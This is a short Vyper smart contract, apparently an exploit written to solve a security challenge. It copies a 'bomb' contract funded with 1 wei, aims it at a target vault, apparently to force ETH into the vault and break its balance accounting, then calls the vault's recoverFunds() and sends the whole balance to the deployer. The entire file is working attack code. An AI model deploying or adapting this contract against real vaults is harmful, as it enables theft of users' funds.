# @version ^0.3.7

interface IVault:
    def recoverFunds(): nonpayable

owner: immutable(address)

vault: address

@external
@payable
def __init__(_vault: address):
    assert msg.value > as_wei_value(0.0001, "ether"), "send ETH"
    owner = msg.sender
    self.vault = _vault

@external
def attack(_bomb: address):
    assert msg.sender == owner, "!owner"
    bomb: address = create_copy_of(_bomb, value=1)
    raw_call(bomb, _abi_encode(self.vault))
    IVault(self.vault).recoverFunds()
    send(owner, self.balance)

@external
@payable
def __default__():
    pass
